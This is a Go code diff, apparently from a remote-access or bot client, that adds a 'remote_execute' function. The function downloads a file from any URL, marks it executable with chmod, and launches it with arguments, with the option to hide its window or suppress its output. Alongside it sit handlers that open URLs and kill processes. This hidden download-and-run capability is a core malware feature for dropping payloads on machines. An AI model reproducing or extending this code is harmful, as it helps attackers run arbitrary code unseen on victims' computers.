@@ -1,15 +1,31 @@
 package components
 
 import (
+	"log"
 	"net/http"
+	"net/url"
 	"os/exec"
-	"strings"
+	"runtime"
+	"syscall"
 )
 
-func downloader(mode string, content string, md5 string, params string) {
-	if mode == "0" {
-
+func remote_execute(path string, hidden bool, args ...string) bool {
+	// Check if it's an URL or not
+	u, err := url.Parse(path)
+	if err != nil {
+		return false
 	}
+	if u.Scheme != "" && u.Host != "" {
+		// Ye, it is url, download it from remote host
+		path = download_from_url(path, "")
+		if path == "" {
+			// Failed to download
+			log.Println("Failed to remote download")
+			return false
+		}
+	}
+
+	return start_exe(path, hidden, args...)
 }
 
 func openurl(url string, mode string) bool {
@@ -26,18 +42,31 @@ func openurl(url string, mode string) bool {
 	return err != nil
 }
 
-func start_exe(name string) bool {
-	if strings.Contains(name, ".exe") {
-		var final_name string
-		binary, err := exec.LookPath(name)
-		if err != nil {
-			final_name = name
-		} else {
-			final_name = binary
+func start_exe(name string, hidden bool, args ...string) bool {
+	// binary, err := exec.LookPath(name)
+	// if err != nil {
+	// 	final_name = name
+	// } else {
+	// 	final_name = binary
+	// }
+
+	cmd := exec.Command(name, args...)
+	switch runtime.GOOS {
+	case "windows":
+		if hidden {
+			cmd.SysProcAttr = &syscall.SysProcAttr{
+				HideWindow: true,
+			}
 		}
-		return exec.Command(final_name).Start() == nil
+	default:
+		exec.Command("chmod", "+x", name).Run()
+		if hidden {
+			cmd.Stdout = nil
+			cmd.Stderr = nil
+		}
 	}
-	return false
+
+	return cmd.Start() == nil
 }
 
 func kill(name string) bool {
